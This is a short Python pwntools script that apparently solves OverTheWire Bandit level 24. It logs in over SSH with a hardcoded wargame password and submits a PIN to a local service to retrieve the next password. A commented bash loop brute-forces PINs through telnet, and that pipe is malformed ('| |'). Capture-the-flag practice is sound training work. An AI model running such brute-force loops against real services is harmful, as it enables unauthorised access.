from pwn import *
import re
user = "bandit24"
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
host = "bandit.labs.overthewire.org"
port = 2220

shell = ssh(user, host, password=password, port=port)
sh = shell.run('sh')
sh.sendline("echo 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 2588' | nc localhost 30002 | grep -n 3")
flag = sh.recvline().decode("utf-8")
result = re.findall("[0-9A-Za-z]{32}", flag)
final = result[0]
print("The password for Bandit25 is === $" + final)
sh.close()

'''

The correct PIN for that is 2588 after brute forcing


#!/bin/bash

for i in {2585..2590}
do
        echo $i
        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" 

done | | telnet localhost 30002 | grep "Correct!"
'''
